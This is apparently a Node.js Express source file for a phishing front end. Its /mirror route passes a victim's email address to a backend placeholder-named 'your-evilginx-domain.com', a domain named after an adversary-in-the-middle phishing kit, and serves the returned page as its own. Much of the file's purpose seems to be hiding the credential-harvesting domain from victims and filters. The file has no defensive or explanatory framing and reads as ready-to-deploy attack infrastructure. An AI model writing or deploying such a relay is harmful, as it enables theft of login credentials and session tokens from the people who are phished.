const express = require("express");
const fetch = require("node-fetch");
const app = express();

const BACKEND_URL = "https://www.your-evilginx-domain.com/manage-it/index.jsp";

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.get("/mirror", async (req, res) => {
  try {
    const email = req.query.email ? `?email=${encodeURIComponent(req.query.email)}` : "";
    const response = await fetch(`${BACKEND_URL}${email}`);
    const html = await response.text();
    res.set("Content-Type", "text/html");
    res.send(html);
  } catch (err) {
    console.error(err);
    res.status(500).send("Error loading content.");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Mirror frontend running on port " + PORT);
});
